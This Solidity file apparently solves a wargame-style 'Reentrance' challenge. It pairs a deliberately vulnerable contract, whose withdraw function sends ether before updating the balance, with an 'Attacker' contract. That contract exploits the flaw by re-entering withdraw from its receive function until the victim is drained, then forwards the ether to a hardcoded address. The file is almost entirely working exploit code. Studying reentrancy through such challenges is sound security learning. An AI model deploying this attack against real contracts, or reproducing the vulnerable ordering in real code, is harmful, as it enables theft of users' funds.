// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attacker {
    address constant ME = 0xEc87686f18DeCFf388198570058C94E55E384cBC;
    uint constant AMOUNT = 1000000000000000;
    Reentrance public victim;


    function attack(Reentrance _victim) public payable{
        victim = _victim;
        victim.donate{value: AMOUNT}(address(this));
        victim.withdraw(AMOUNT);
    }

    function withdraw() public {
        payable(ME).transfer(address(this).balance);
    }

    receive() external payable {
        if(address(victim).balance > 0) {
            victim.withdraw(AMOUNT);
        }
    }
}